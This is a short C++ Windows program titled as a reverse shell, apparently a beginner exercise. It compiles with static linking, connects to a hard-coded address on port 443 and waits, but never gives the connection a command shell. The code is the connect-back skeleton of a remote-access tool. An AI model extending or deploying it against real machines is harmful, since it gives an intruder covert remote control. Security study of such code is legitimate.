//Compile Instructions. Visual Studio will error out during compilation process because of some deprecated libraries/functions being used.
//I used g++ for compilation.
// g++ -std=c++11 revshell101.cpp -o revshell101.exe -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

//Make sure to incnlude winsock2.h header before windows.h
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <WS2tcpip.h>

#pragma comment(lib,"Ws2_32.lib")
#define DEFAULT_BUFFLEN 1024

void ReverseShell() {

  //Defining structs.
	WSADATA wsSockData = { 0 };
	WSAStartup(MAKEWORD(2, 2), &wsSockData);

  //Creating an IPV4 socket.
	SOCKET DummySocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (DummySocket == INVALID_SOCKET) {
		printf("[!] Failed to create a socket.\nExiting with error: %ld\n", WSAGetLastError());
		exit(0);
	}
	printf("[+] Socket created!\n");

  //defining sockaddr_in struct.
	sockaddr_in sockaddr;
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(443);
	sockaddr.sin_addr.s_addr = inet_addr("192.168.129.59");

  //Function which connects to the target IP & port. Implementing socket connection.
	if (connect(DummySocket, (SOCKADDR*)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR) {
		printf("[!] Failed connecting to socket.\nExiting with error: %ld\n", WSAGetLastError());
		closesocket(DummySocket);
		WSACleanup();
		exit(0);
	}
	else {
		printf("[+] Connected!\n[+] Press <ENTER> to exit\n");
		getchar();
	}
	closesocket(DummySocket);
	WSACleanup();
	exit(0);
}


int main() {

	ReverseShell();

	return EXIT_SUCCESS;

}
